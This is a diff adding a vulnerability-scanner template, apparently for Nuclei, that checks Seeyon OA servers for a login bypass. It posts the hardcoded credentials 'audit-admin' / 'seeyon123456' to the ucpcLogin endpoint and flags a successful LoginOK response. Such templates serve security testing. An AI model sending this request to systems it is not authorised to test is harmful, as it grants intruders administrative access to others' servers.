@@ -1,0 +1,21 @@
+http:
+- body: 'UserAgentFrom=iphone&login_username=audit-admin&login_password=seeyon123456
+
+    '
+  matchers:
+  - part: body
+    type: word
+    words:
+    - '{"LoginOK":"ok","loginName":"audit-admin"}'
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: POST
+  path:
+  - '{{BaseURL}}/seeyon/rest/authentication/ucpcLogin'
+id: seeyon-oa-ucpcLogin-login-bypass
+info:
+  author: Co5mos
+  name: Seeyon OA - Login Bypass
+  severity: high
